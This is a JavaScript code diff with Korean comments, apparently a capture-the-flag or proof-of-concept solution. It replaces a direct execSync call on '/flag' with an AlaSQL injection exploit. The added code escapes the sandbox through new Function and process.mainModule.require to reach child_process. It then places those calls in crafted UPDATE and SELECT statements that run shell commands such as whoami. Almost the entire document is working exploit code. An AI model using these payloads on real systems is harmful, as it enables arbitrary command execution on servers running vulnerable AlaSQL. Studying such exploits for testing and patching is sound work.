@@ -1,18 +1,14 @@
-const { execSync } = require('child_process');
+const genPayload = command => 
+  new Function(
+    'return this.process.mainModule.require'
+  )()('child_process').execSync(`${command}`).toString().trim();  // execSync 실행 결과를 문자열로 변환하고 앞뒤 공백 제거
 
-try {
-  // /flag 파일을 직접 실행하여 결과 가져오기
-  const flagContent = execSync('/flag').toString().trim();
+alasql('CREATE table i_am_a_table;' +
+    'INSERT INTO i_am_a_table VALUES (1337);' +
 
-  // AlaSQL에서 사용할 테이블 생성
-  alasql('CREATE TABLE woo (a STRING)');  
-
-  // /flag 파일 내용을 테이블에 삽입
-  alasql('INSERT INTO woo VALUES (?)', [flagContent]);
-
-  // 테이블 내용을 출력하여 확인
-  const tableContent = alasql('SELECT * FROM woo');
-  console.log("woo 테이블 내용:", tableContent);
-} catch (error) {
-  console.error("파일을 실행하는 중 오류 발생:", error.message);
-}
+    // whoami의 결과값을 42 대신에 넣기
+    `UPDATE i_am_a_table SET [0'+${genPayload("whoami")}+'] = '${genPayload("whoami")}';` +  // whoami 결과를 테이블에 저장
+    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
+    `SELECT \'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\ from i_am_a_table where 1;` +
+    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
+);
